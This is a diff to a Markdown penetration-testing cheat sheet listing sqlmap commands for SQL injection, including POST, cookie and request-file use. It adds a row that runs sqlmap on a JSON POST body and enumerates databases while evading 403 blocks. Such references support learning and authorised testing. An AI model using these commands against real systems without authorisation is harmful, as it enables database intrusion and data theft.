@@ -93,6 +93,7 @@ nmap --proxies http://127.0.0.1:8080 SERVER_IP -pPORT -Pn -sC
 | `sqlmap -hh`                                                                                                              | View the advanced help menu                                 |
 | `sqlmap -u "http://www.example.com/vuln.php?id=1" --batch`                                                                | Run `SQLMap` without asking for user input                  |
 | `sqlmap 'http://www.example.com/' --data 'uid=1&name=test'`                                                               | `SQLMap` with POST request                                  |
+| `sqlmap -u 'https://site.com' --data '{"User":"abcdefg","Pwd":"Abc@123"}' --random-agent --ignore-code=403 --dbs --hex`   | SQLMap POST with JSON data                                  |
 | `sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'`                                                              | POST request specifying an injection point with an asterisk |
 | `sqlmap -r req.txt`                                                                                                       | Passing an HTTP request file to `SQLMap`                    |
 | `sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'`                                                        | Specifying a cookie header                                  |
